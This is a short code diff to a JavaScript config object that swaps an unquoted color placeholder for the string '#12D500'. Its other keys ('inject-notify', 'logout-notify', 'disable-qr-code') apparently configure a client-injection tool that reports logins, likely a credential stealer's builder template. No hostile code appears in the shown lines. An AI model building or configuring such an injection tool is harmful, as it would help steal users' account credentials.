@@ -13,7 +13,7 @@ const config = {
     "inject-notify": "%INJECTNOTI%1",
     "logout-notify": "%LOGOUTNOTI%1",
     "init-notify":"%INITNOTI%1",
-    "embed-color": %MBEDCOLOR%1,
+    "embed-color": "#12D500",
     "disable-qr-code": "%DISABLEQRCODE%1"
 }
 
